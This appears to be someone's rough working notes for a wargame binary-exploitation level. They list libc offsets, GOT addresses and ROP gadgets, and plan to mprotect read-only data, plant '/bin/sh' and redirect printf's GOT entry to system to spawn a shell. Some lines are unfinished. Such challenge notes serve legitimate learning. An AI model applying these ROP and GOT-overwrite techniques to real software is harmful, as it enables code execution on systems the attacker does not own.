Almost identical to vortex 8 except the stack is NX!

Need a ropgadget to overwrite fflush or printf GOT entry

Bases/Addresses:
  0xf7c00000 - libc base
  0x804c014  - fflush@got.plt
  0x804a008  - "%d" @rodata
  0xf7c6fb60 - fgets addr
Important offsets: 
  0x47cb0 - offset to system
  0x001b90f5 - /bin/sh\x00 string
  0x00119f50 - mprotect offset

ROP Chain:
- Some kind of pop/pop/write/ret gadget to construct a fake 
  stack in the GOT where I'll write the rop chain to call system?
- Pop fflush@got.plt addr into reg
- Pop ROP chain start into 

Gadgets (libc):

 Arbitrary write
   vortex libc:
 - 0x00125873: pop edx; pop ecx; pop eax; ret; 
 - 0x0004a7b6: mov dword ptr [edx], ecx; ret; 
 - 0x000218c7: jmp eax;

   my libc:
 - 0x12b3e3: pop edx; pop ecx; pop eax; ret; 
 - 0x3a7c6: mov dword ptr [edx], ecx; ret; 
 - 0x3d43cd: jmp eax;



 -  0x17e09e      mov   eax, 0xffffffff                      ; -1
    0x17e0a3      ret

 - 

 - 0x0011d581         b803000000  mov eax, 3
   0x0011d586                 5b  pop ebx
   0x0011d587                 5e  pop esi
   0x0011d588                 5f  pop edi
   0x0011d589                 c3  ret

 - 0x00193f56: mov eax, 0xc; pop edi; ret; 
 - 0x0002c51e: xchg eax, esi; ret; 
 - 0x000613b5: push esi; ret; 
 - 0x0008192d: push edx; push ecx; push esi; call eax; 

 Idea now - ROP to call mprotect on RODATA section to make it writable.
 Replace '%d' string in rodata with /bin/sh, and printf@got.plt with system
 bada bing bada boom.

 mov eax, 3; pop ebx; pop esi; ret

 Maybe make call to fgets to populate stack with my own values instead??

 push push push call
0x824f2
            0xf7c824f2      push  ecx
        ╎   0xf7c824f3      push  edi
        ╎   0xf7c824f4      push  eax
        ╎   0xf7c824f5      push  edx
        ╎   0xf7c824f6      mov   eax, dword [esp + 0x24]
        ╎   0xf7c824fa      call  eax
        ╎   0xf7c824fc      mov   dword [esi + 8], eax
        ╎   0xf7c824ff      add   esp, 0x3c
        ╎   0xf7c82502      pop   ebx
        ╎   0xf7c82503      pop   esi
        ╎   0xf7c82504      pop   edi
        ╎   0xf7c82505      pop   ebp
        ╎   0xf7c82506      ret
        ╎   0xf7c82507      lea   esi, [esi]
        ╎   0xf7c8250e      nop
        ╎   0xf7c82510      lea   edx, [ebx - 0x6632d]
        └─< 0xf7c82516      jmp   0xf7c824e6
            0xf7c82518      push  eax
            0xf7c82519      lea   eax, [ebx - 0x651b9]
            0xf7c8251f      push  5                                    ; 5
[0xf7c824f2]> 


0x82979 - a better push push push?
            0xf7c82979      push  esi
            0xf7c8297a      push  eax
            0xf7c8297b      push  ecx
            0xf7c8297c      call  edx
            0xf7c8297e      mov   ebx, eax
            0xf7c82980      add   esp, 0x10
            0xf7c82983      mov   eax, dword [esp + 0x1c]
            0xf7c82987      sub   eax, dword gs:[0x14]
        ┌─< 0xf7c8298e      jne   0xf7c829c1
        │   0xf7c82990      add   esp, 0x20
        │   0xf7c82993      mov   eax, ebx
        │   0xf7c82995      pop   ebx
        │   0xf7c82996      pop   esi
        │   0xf7c82997      pop   edi
        │   0xf7c82998      ret
        │   0xf7c82999      lea   esi, [esi]
        │   0xf7c829a0      sub   esp, 8
        │   0xf7c829a3      lea   eax, [esp + 0x14]
        │   0xf7c829a7      push  eax
        │   0xf7c829a8      lea   eax, [edi - 0x1a05a4]
[0xf7c82390]> 

XOR gadget?:
  0xf7d9b2d9           8276fcff  xor byte [esi - 4], 0xff
  0xf7d9b2dd             ff6690  jmp dword [esi - 0x70]

another xor gadget...
  0xf7d92b49           8270ffff  xor byte [eax - 1], 0xff
  0xf7d92b4d             ff660f  jmp dword [esi + 0xf]

AND edx, 0xf
0xf7cfebf6: and edx, 0xf; mov eax, edx; ret; 

AND al, 8 - set mem page
0xf7c2f05a: and al, 8; ret; 

AND al, 0xc
0xf7d969a4: and al, 0xc; pop edi; ret; 

XCHG EAX, EBP
0xf7c4084b: xchg eax, ebp; ret; 

ADD EAX, EDX
0xf7cb54f3: add eax, edx; ret; 

INC EBP
0xf7c3d6a0: sti; dec dword ptr [edi]; inc ebp; ret; 

> eax, esi, edx/ebp

XCHG EAX, ESI
0xf7c25b66: xchg eax, esi; ret; 

POP EDX
0xf7c36425: pop edx; ret; 

POP ECX, POP EDX
0xf7c36424: pop ecx; pop edx; ret; 

POP EBX, RET
0xf7c2a9f9: pop ebx; ret; 


PUSH EBP, CALL E?X
0xf7cb7c14: push ebp; call ebx; 
0xf7cc5ee9: push ebp; call edi; 
0xf7cb7f8f: push ebp; call esi; 

POP EDX, ECX, EAX
0xf7d2b3e3: pop edx; pop ecx; pop eax; ret; 

SYSSCALL
0xf7d1f781 <mprotect+17>:    mov    eax,0x7d
0xf7d1f786 <mprotect+22>:    call   DWORD PTR gs:0x10
0xf7d1f78d <mprotect+29>:    pop    ebx
0xf7d1f78e <mprotect+30>:    cmp    eax,0xfffff001
0xf7d1f793 <mprotect+35>:    jae    0xf7c1f890
0xf7d1f799 <mprotect+41>:    ret
